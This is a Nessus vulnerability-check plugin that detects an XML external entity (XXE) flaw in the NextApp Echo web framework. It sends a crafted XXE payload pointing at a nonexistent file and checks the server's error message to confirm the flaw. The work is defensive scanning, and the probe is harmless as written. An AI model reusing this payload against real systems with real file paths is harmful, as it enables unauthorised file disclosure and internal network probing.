#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(36017);
  script_version("$Revision: 1.5 $");
  
  script_bugtraq_id(34060);
  script_xref(name:"Secunia", value:"34218");
  script_xref(name:"OSVDB", value:"52889");

  script_name(english:"NextApp Echo XML External Entity Handling Privilege Escalation");
  script_summary(english:"Tries to access a nonexistent file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote host is running a vulnerable web application that may\n",
      "allow an attacker to access data from the local filesystem,\n",
      "cause a denial of service, or scan the local network."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running a web application that uses Echo, a\n",
      "web framework written in Java.\n",
      "\n",
      "The web application on the remote host uses a version of Echo\n",
      "that accepts unverified XML data from the client.  A malicious\n",
      "client can use this to direct the server to arbitrary URIs.  This\n",
      "could potentially lead to file disclosure, denial of service, or\n",
      "local network scanning."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"https://www.sec-consult.com/files/20090305-0_echo_nextapp_xml_injection.txt"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/bugtraq/2009-03/0098.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://echo.nextapp.com/site/node/5742"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to Echo 2.1.1/3.0.b6 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:C"
  );
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

test_file = string(SCRIPT_NAME, "-", unixtime());
exploit_xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "/' + test_file + '">]><foo>&xxe;</foo>';

# Identifies directories where there may be Echo apps
web_dirs = get_kb_list(string("www/", port, "/content/directories"));
if(!web_dirs) web_dirs = cgi_dirs();

if (thorough_tests)
  web_dirs = list_uniq(make_list(web_dirs, "/ChatClient", "/NumberGuess"));

# Gets the content of the given document from the webserver.
# Used when the index file of a directory contains a redirect
# (which is how the Echo example apps are set up)
function follow_redirect()
{
  local_var doc, contents, response;
  doc = _FCT_ANON_ARGS[0];

  response = http_send_recv3(port:port, method:"GET", item:doc);

  if (isnull(response)) exit(0);

  if (response && response[0] =~ '^HTTP/1\\.[01] +200 ')
    contents = response[2];
  else
    contents = NULL;

  return contents;
}

# Determines if the given document content indicates
# an application is using the Echo framework
function is_echo_app()
{
  local_var contents, is_echo;
  contents = _FCT_ANON_ARGS[0];
  is_echo = FALSE;

  if (contents =~ '<meta content="NextApp Echo v') is_echo = TRUE;

  return is_echo;
}

# Determines if the given directory contains an Echo application.
# If so, returns the remote path of the app
function get_echo_app_path()
{
  local_var app_path, contents, is_echo, response, redirect_url;
  app_path = _FCT_ANON_ARGS[0] + "/";
  is_echo = FALSE;

  response = http_send_recv3(port:port, method:"GET", item:app_path);

  if (isnull(response)) exit(0);

  if (response[0] =~ '^HTTP/1\\.[01] +200 ')
  {
    redirect_url = eregmatch(
      pattern:'<a href="([^ ]+)">Redirecting to application...</a>',
      string:response[2]
    );

    if (redirect_url)
    {
      app_path = app_path + redirect_url[1];
      contents = follow_redirect(app_path);
    }
    else contents = response[2];

    if (!contents || !is_echo_app(contents)) app_path = NULL;
  }
  else app_path = NULL;

  return app_path;
}

# This function will test the vulnerability by seeing if the remote host
# will respond to a request to read a local file
function exploit_echo()
{
  local_var document, xml, exploited, response, content_type;
  document = _FCT_ANON_ARGS[0];
  xml = _FCT_ANON_ARGS[1];
  exploited = FALSE;

  response = http_send_recv3(
    port:port,
    method:"POST",
    item:document + "?serviceId=Echo.Synchronize",
    add_headers:make_array("Content-Type", "text/xml; charset=UTF-8"),
    data:xml
  );

  if (isnull(response)) exit(0);

  #if the response indicates the server tried to read a local file,
  #the exploit was successful
  if (response[2] =~ 'java.io.FileNotFoundException: [\\/]' + test_file)
    exploited = TRUE;

  return exploited;
}

# Script execution starts here
foreach dir (web_dirs)
{
  app_path = get_echo_app_path(dir);

  if (app_path && exploit_echo(app_path, exploit_xml))
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue by using an XML external\n",
        "entity.  The exploited application is located at the\n",
        "following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:app_path), "\n"
      );
 
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}

